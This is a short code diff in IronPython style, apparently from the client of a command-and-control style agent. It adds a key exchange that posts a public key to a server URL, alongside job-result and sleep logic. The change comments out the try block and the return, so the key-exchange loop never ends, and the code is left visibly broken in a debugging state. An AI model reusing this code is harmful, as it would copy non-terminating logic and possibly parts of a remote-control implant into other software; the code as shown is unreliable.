@@ -20,7 +20,7 @@ class Response(object):
             with response.GetResponseStream() as reader:
                 reader.CopyTo(memstream)
                 data = memstream.ToArray()
-                reader.Close
+                reader.Close()
         response.Close()
         self.request.Abort()
         return data
@@ -81,13 +81,15 @@ class Comms(Serializable):
 
     def key_exchange(self):
         while True:
-            try:
-                self.crypto = Crypto()
-                return
-            except Exception as e:
-                if DEBUG:
-                    print "Error performing key exchange: " + str(e)
-                    print_traceback()
+            #try:
+            self.crypto = Crypto()
+            r = self.requests.post(self.base_url, payload=self.crypto.public_key)
+            self.crypto.derive_key(JavaScriptSerializer().DeserializeObject(r.text))
+            #return
+            #except Exception as e:
+            #    if DEBUG:
+            #        print "Error performing key exchange: " + str(e)
+            #        print_traceback()
             Thread.Sleep(self.client.SLEEP)
 
     def send_job_results(self, results, job_id):
